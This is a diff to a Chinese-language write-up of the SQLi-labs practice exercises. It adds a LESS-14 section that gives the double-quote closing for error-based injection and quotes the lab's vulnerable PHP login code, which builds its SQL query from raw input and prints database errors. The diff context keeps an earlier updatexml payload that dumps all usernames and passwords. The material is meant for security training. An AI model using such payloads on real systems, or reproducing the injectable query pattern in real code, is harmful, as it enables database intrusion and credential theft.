@@ -343,4 +343,39 @@ echo "</font>";  }
 - `uname=1&passwd=1') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'~',password)) from users),1,31),0x7e),1) --+`
 
 
-## LESS-14
+## LESS-14 #报错注入 
+
+闭合方式为 `"`
+```php
+$uname='"'.$uname.'"';  
+$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";  
+$result=mysql_query($sql);  
+$row = mysql_fetch_array($result);  
+  
+if($row)  
+{  
+      //echo '<font color= "#0000ff">';    
+        
+echo "<br>";  
+   echo '<font color= "#FFFF00" font size = 4>';  
+   //echo " You Have successfully logged in " ;  
+   echo '<font size="3" color="#0000ff">';      
+echo "<br>";  
+   //echo 'Your Login name:'. $row['username'];  
+   //echo "<br>";   //echo 'Your Password:' .$row['password'];   //echo "<br>";   echo "</font>";  
+   echo "<br>";  
+   echo "<br>";  
+   echo '<img src="../images/flag.jpg" />';     
+     
+echo "</font>";  
+   }  
+else  {  
+   echo '<font color= "#0000ff" font size="3">';  
+   //echo "Try again looser";  
+   print_r(mysql_error());  
+   echo "</br>";  
+   echo "</br>";  
+   echo "</br>";  
+   echo '<img src="../images/slap.jpg"  />';    
+echo "</font>";  }
+```
